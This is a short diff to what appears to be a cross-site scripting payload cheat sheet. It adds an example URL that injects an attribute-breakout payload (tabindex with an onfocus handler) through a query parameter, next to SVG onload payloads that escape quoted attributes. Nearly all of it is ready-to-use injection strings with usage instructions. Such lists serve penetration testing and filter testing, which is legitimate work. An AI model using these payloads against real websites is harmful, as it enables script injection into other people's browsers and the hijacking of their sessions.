@@ -33,6 +33,11 @@ something({"some/thing":{"key":[{"name":"</script ","age":"","country":"","addre
 For Attribute context use:
 ```
 bbbbb" id="bbbbb" Only=1 tabindex=1 onfocus=alert(1) a
+```
+Sample usage would be: `http://example.com?parameter=bbbbb%22%20id%3D%22bbbbb%22%20Only%3D1%20tabindex%3D1%20onfocus%3Dalert(1)%20a#bbbbb`  
+
+Or:
+```
 "><svg/oni=on onload=confirm(2)>
 '><svg/oni=on onload=confirm(2)>
 ```
